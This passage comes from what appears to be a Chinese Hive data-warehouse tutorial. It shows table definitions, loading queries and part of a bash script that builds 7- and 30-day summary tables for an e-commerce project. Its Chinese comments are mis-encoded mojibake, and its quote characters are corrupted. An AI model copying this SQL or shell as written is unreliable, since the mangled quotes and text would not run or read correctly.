è´­æ¬¡æ•°â€™,</p><p>`cart_add_num_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥åŠ è´­å•†å“ä»¶æ•°â€™,</p><p>`cart_add_count_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥åŠ è´­æ¬¡æ•°â€™,</p><p>`cart_add_num_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥åŠ è´­å•†å“ä»¶æ•°â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_cart_add_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_user_cart_add_nd partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),cart_add_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),cart_add_num_1d,0)),</p><p>sum(cart_add_count_1d),</p><p>sum(cart_add_num_1d)</p><p>from dws_trade_user_cart_add_1d</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>and dt&lt;=â€™2020-06-14â€™</p><p>group by user_id;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_payment_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_payment_nd</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`payment_count_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥æ”¯ä»˜æ¬¡æ•°â€™,</p><p>`payment_num_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥æ”¯ä»˜å•†å“ä»¶æ•°â€™,</p><p>`payment_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥æ”¯ä»˜é‡‘é¢â€™,</p><p>`payment_count_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥æ”¯ä»˜æ¬¡æ•°â€™,</p><p>`payment_num_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥æ”¯ä»˜å•†å“ä»¶æ•°â€™,</p><p>`payment_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥æ”¯ä»˜é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_payment_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_user_payment_nd partition (dt = â€˜2020-06-14â€™)</p><p>select user_id,</p><p>sum(if(dt &gt;= date_add(â€˜2020-06-14â€™, -6), payment_count_1d, 0)),</p><p>sum(if(dt &gt;= date_add(â€˜2020-06-14â€™, -6), payment_num_1d, 0)),</p><p>sum(if(dt &gt;= date_add(â€˜2020-06-14â€™, -6), payment_amount_1d, 0)),</p><p>sum(payment_count_1d),</p><p>sum(payment_num_1d),</p><p>sum(payment_amount_1d)</p><p>from dws_trade_user_payment_1d</p><p>where dt &gt;= date_add(â€˜2020-06-14â€™, -29)</p><p>and dt &lt;= â€˜2020-06-14â€™</p><p>group by user_id;</p><h4 id="äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_province_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_province_order_nd</p><p>(</p><p>`province_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`province_name` STRING COMMENT â€˜çœä»½åç§°â€™,</p><p>`area_code` STRING COMMENT â€˜åœ°åŒºç¼–ç â€™,</p><p>`iso_code` STRING COMMENT â€˜æ—§ç‰ˆISO-3166-2ç¼–ç â€™,</p><p>`iso_3166_2` STRING COMMENT â€˜æ–°ç‰ˆç‰ˆISO-3166-2ç¼–ç â€™,</p><p>`order_count_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_original_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™,</p><p>`order_count_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_original_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_30d` DECIMAL(16, 2) COMMENT<br>â€˜æœ€è¿‘30æ—¥ä¸‹å•æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_30d` DECIMAL(16, 2) COMMENT<br>â€˜æœ€è¿‘30æ—¥ä¸‹å•ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_province_order_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_province_order_nd partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from dws_trade_province_order_1d</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>and dt&lt;=â€™2020-06-14â€™</p><p>group by province_id,province_name,area_code,iso_code,iso_3166_2;</p><h4 id="äº¤æ˜“åŸŸä¼˜æƒ åˆ¸ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸä¼˜æƒ åˆ¸ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸä¼˜æƒ åˆ¸ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸä¼˜æƒ åˆ¸ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_coupon_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_coupon_order_nd</p><p>(</p><p>`coupon_id` STRING COMMENT â€˜ä¼˜æƒ åˆ¸idâ€™,</p><p>`coupon_name` STRING COMMENT â€˜ä¼˜æƒ åˆ¸åç§°â€™,</p><p>`coupon_type_code` STRING COMMENT â€˜ä¼˜æƒ åˆ¸ç±»å‹idâ€™,</p><p>`coupon_type_name` STRING COMMENT â€˜ä¼˜æƒ åˆ¸ç±»å‹åç§°â€™,</p><p>`coupon_rule` STRING COMMENT â€˜ä¼˜æƒ åˆ¸è§„åˆ™â€™,</p><p>`start_date` STRING COMMENT â€˜å‘å¸ƒæ—¥æœŸâ€™,</p><p>`original_amount_30d` DECIMAL(16, 2) COMMENT â€˜ä½¿ç”¨ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`coupon_reduce_amount_30d` DECIMAL(16, 2) COMMENT â€˜ä½¿ç”¨ä¸‹å•ä¼˜æƒ é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸä¼˜æƒ åˆ¸ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_coupon_order_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_coupon_order_nd partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type_code,</p><p>coupon_type_name,</p><p>benefit_rule,</p><p>start_date,</p><p>sum(split_original_amount),</p><p>sum(split_coupon_amount)</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type_code,</p><p>coupon_type_name,</p><p>benefit_rule,</p><p>date_format(start_time,â€™yyyy-MM-ddâ€™) start_date</p><p>from dim_coupon_full</p><p>where dt=â€™2020-06-14â€™</p><p>and date_format(start_time,â€™yyyy-MM-ddâ€™)&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>)cou</p><p>left join</p><p>(</p><p>select</p><p>coupon_id,</p><p>order_id,</p><p>split_original_amount,</p><p>split_coupon_amount</p><p>from dwd_trade_order_detail_inc</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>and dt&lt;=â€™2020-06-14â€™</p><p>and coupon_id is not null</p><p>)od</p><p>on cou.id=od.coupon_id</p><p>group by<br>id,coupon_name,coupon_type_code,coupon_type_name,benefit_rule,start_date;</p><h4 id="äº¤æ˜“åŸŸæ´»åŠ¨ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸæ´»åŠ¨ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸæ´»åŠ¨ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸæ´»åŠ¨ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_activity_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_activity_order_nd</p><p>(</p><p>`activity_id` STRING COMMENT â€˜æ´»åŠ¨idâ€™,</p><p>`activity_name` STRING COMMENT â€˜æ´»åŠ¨åç§°â€™,</p><p>`activity_type_code` STRING COMMENT â€˜æ´»åŠ¨ç±»å‹ç¼–ç â€™,</p><p>`activity_type_name` STRING COMMENT â€˜æ´»åŠ¨ç±»å‹åç§°â€™,</p><p>`start_date` STRING COMMENT â€˜å‘å¸ƒæ—¥æœŸâ€™,</p><p>`original_amount_30d` DECIMAL(16, 2) COMMENT â€˜å‚ä¸æ´»åŠ¨è®¢å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_30d` DECIMAL(16, 2) COMMENT â€˜å‚ä¸æ´»åŠ¨è®¢å•ä¼˜æƒ é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸæ´»åŠ¨ç²’åº¦è®¢å•æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_activity_order_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_activity_order_nd partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>act.activity_id,</p><p>activity_name,</p><p>activity_type_code,</p><p>activity_type_name,</p><p>date_format(start_time,â€™yyyy-MM-ddâ€™),</p><p>sum(split_original_amount),</p><p>sum(split_activity_amount)</p><p>from</p><p>(</p><p>select</p><p>activity_id,</p><p>activity_name,</p><p>activity_type_code,</p><p>activity_type_name,</p><p>start_time</p><p>from dim_activity_full</p><p>where dt=â€™2020-06-14â€™</p><p>and date_format(start_time,â€™yyyy-MM-ddâ€™)&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>group by activity_id, activity_name, activity_type_code,<br>activity_type_name,start_time</p><p>)act</p><p>left join</p><p>(</p><p>select</p><p>activity_id,</p><p>order_id,</p><p>split_original_amount,</p><p>split_activity_amount</p><p>from dwd_trade_order_detail_inc</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>and dt&lt;=â€™2020-06-14â€™</p><p>and activity_id is not null</p><p>)od</p><p>on act.activity_id=od.activity_id</p><p>group by<br>act.activity_id,activity_name,activity_type_code,activity_type_name,start_time;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_refund_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_refund_nd</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`order_refund_count_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥é€€å•æ¬¡æ•°â€™,</p><p>`order_refund_num_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥é€€å•å•†å“ä»¶æ•°â€™,</p><p>`order_refund_amount_7d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘7æ—¥é€€å•é‡‘é¢â€™,</p><p>`order_refund_count_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥é€€å•æ¬¡æ•°â€™,</p><p>`order_refund_num_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥é€€å•å•†å“ä»¶æ•°â€™,</p><p>`order_refund_amount_30d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘30æ—¥é€€å•é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_order_refund_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_trade_user_order_refund_nd partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_refund_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_refund_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),order_refund_amount_1d,0)),</p><p>sum(order_refund_count_1d),</p><p>sum(order_refund_num_1d),</p><p>sum(order_refund_amount_1d)</p><p>from dws_trade_user_order_refund_1d</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>and dt&lt;=â€™2020-06-14â€™</p><p>group by user_id;</p><h4 id="æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘næ—¥æ±‡æ€»è¡¨"><a href="#æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘næ—¥æ±‡æ€»è¡¨" class="headerlink" title="æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘næ—¥æ±‡æ€»è¡¨"></a>æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘næ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_traffic_page_visitor_page_view_nd;</p><p>CREATE EXTERNAL TABLE dws_traffic_page_visitor_page_view_nd</p><p>(</p><p>`mid_id` STRING COMMENT â€˜è®¿å®¢idâ€™,</p><p>`brand` string comment â€˜æ‰‹æœºå“ç‰Œâ€™,</p><p>`model` string comment â€˜æ‰‹æœºå‹å·â€™,</p><p>`operate_system` string comment â€˜æ“ä½œç³»ç»Ÿâ€™,</p><p>`page_id` STRING COMMENT â€˜é¡µé¢idâ€™,</p><p>`during_time_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥æµè§ˆæ—¶é•¿â€™,</p><p>`view_count_7d` BIGINT COMMENT â€˜æœ€è¿‘7æ—¥è®¿é—®æ¬¡æ•°â€™,</p><p>`during_time_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥æµè§ˆæ—¶é•¿â€™,</p><p>`view_count_30d` BIGINT COMMENT â€˜æœ€è¿‘30æ—¥è®¿é—®æ¬¡æ•°â€™</p><p>) COMMENT â€˜æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘næ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_traffic_page_visitor_page_view_ndâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_traffic_page_visitor_page_view_nd<br>partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),during_time_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜2020-06-14â€™,-6),view_count_1d,0)),</p><p>sum(during_time_1d),</p><p>sum(view_count_1d)</p><p>from dws_traffic_page_visitor_page_view_1d</p><p>where dt&gt;=date_add(â€˜2020-06-14â€™,-29)</p><p>and dt&lt;=â€™2020-06-14â€™</p><p>group by mid_id,brand,model,operate_system,page_id;</p><h4 id="æ•°æ®è£…è½½è„šæœ¬-4"><a href="#æ•°æ®è£…è½½è„šæœ¬-4" class="headerlink" title="æ•°æ®è£…è½½è„šæœ¬"></a>æ•°æ®è£…è½½è„šæœ¬</h4><p><strong>1ï¼‰æ¯æ—¥æ•°æ®è£…è½½è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºdws_1d_to_dws_nd.sh</p><p>[atguigu@hadoop102 bin]$ vim dws_1d_to_dws_nd.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## å¦‚æœæ˜¯è¾“å…¥çš„æ—¥æœŸæŒ‰ç…§å–è¾“å…¥æ—¥æœŸï¼›å¦‚æœæ²¡è¾“å…¥æ—¥æœŸå–å½“å‰æ—¶é—´çš„å‰ä¸€å¤©</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d â€œ-1 dayâ€ +%F`</p><p>fi</p><p>dws_trade_activity_order_nd=â€</p><p>insert overwrite table ${APP}.dws_trade_activity_order_nd<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>act.activity_id,</p><p>activity_name,</p><p>activity_type_code,</p><p>activity_type_name,</p><p>date_format(start_time,â€™yyyy-MM-ddâ€™),</p><p>sum(split_original_amount),</p><p>sum(split_activity_amount)</p><p>from</p><p>(</p><p>select</p><p>activity_id,</p><p>activity_name,</p><p>activity_type_code,</p><p>activity_type_name,</p><p>start_time</p><p>from ${APP}.dim_activity_full</p><p>where dt=â€™$do_dateâ€™</p><p>and date_format(start_time,â€™yyyy-MM-ddâ€™)&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>group by activity_id, activity_name, activity_type_code,<br>activity_type_name,start_time</p><p>)act</p><p>left join</p><p>(</p><p>select</p><p>activity_id,</p><p>order_id,</p><p>split_original_amount,</p><p>split_activity_amount</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>and dt&lt;=â€™$do_dateâ€™</p><p>and activity_id is not null</p><p>)od</p><p>on act.activity_id=od.activity_id</p><p>group by<br>act.activity_id,activity_name,activity_type_code,activity_type_name,start_time;</p><p>â€œ</p><p>dws_trade_coupon_order_nd=â€</p><p>insert overwrite table ${APP}.dws_trade_coupon_order_nd<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type_code,</p><p>coupon_type_name,</p><p>benefit_rule,</p><p>start_date,</p><p>sum(split_original_amount),</p><p>sum(split_coupon_amount)</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type_code,</p><p>coupon_type_name,</p><p>benefit_rule,</p><p>date_format(start_time,â€™yyyy-MM-ddâ€™) start_date</p><p>from ${APP}.dim_coupon_full</p><p>where dt=â€™$do_dateâ€™</p><p>and date_format(start_time,â€™yyyy-MM-ddâ€™)&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>)cou</p><p>left join</p><p>(</p><p>select</p><p>coupon_id,</p><p>order_id,</p><p>split_original_amount,</p><p>split_coupon_amount</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>and dt&lt;=â€™$do_dateâ€™</p><p>and coupon_id is not null</p><p>)od</p><p>on cou.id=od.coupon_id</p><p>group by<br>id,coupon_name,coupon_type_code,coupon_type_name,benefit_rule,start_date;</p><p>â€œ</p><p>dws_trade_province_order_nd=â€</p><p>insert overwrite table ${APP}.dws_trade_province_order_nd<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from ${APP}.dws_trade_province_order_1d</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>and dt&lt;=â€™$do_dateâ€™</p><p>group by province_id,province_name,area_code,iso_code,iso_3166_2;</p><p>â€œ</p><p>dws_trade_user_cart_add_nd=â€</p><p>insert overwrite table ${APP}.dws_trade_user_cart_add_nd<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),cart_add_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),cart_add_num_1d,0)),</p><p>sum(cart_add_count_1d),</p><p>sum(cart_add_num_1d)</p><p>from ${APP}.dws_trade_user_cart_add_1d</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>and dt&lt;=â€™$do_dateâ€™</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_order_nd=â€</p><p>insert overwrite table ${APP}.dws_trade_user_order_nd partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_num_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from ${APP}.dws_trade_user_order_1d</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>and dt&lt;=â€™$do_dateâ€™</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_order_refund_nd=â€</p><p>insert overwrite table ${APP}.dws_trade_user_order_refund_nd<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_refund_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_refund_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(â€˜$do_dateâ€™,-6),order_refund_amount_1d,0)),</p><p>sum(order_refund_count_1d),</p><p>sum(order_refund_num_1d),</p><p>sum(order_refund_amount_1d)</p><p>from ${APP}.dws_trade_user_order_refund_1d</p><p>where dt&gt;=date_add(â€˜$do_dateâ€™,-29)</p><p>and dt&lt;=â€™$do_dateâ€™</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_payment_nd=â€</p><p>insert overwrite table ${APP}.dws_trade_user_payment_nd partition (dt =<br>â€˜$do_dateâ€™)</p><p>select user_id,</p><p>sum(if(dt &gt;= date_add(â€˜$do_dateâ€™, -6), payment_count_1d, 0)),</p><p>sum(if(dt &gt;= date_add(â€˜$do_dateâ€™, -6), payment_num_1d, 0)),</p><p>sum(if(dt &gt;= date_add(â€˜$do_dateâ€™, -6), payment_amount_1d, 0)),</p><p>sum(payment_count_1d),</p><p>sum(payment_num_1d),</p><p>sum(payment_amount_1d)</p><p>from ${APP}.dws_trade_user_payment_1d</p><p>where dt &gt;= date_add(â€˜$do_dateâ€™, -29)</p><p>and dt &lt;= â€˜$do_dateâ€™</p><p>group by user_id;</p><p>â€œ</p><p>dws_trade_user_sku_order_nd=â€</p><p>insert overwrite table 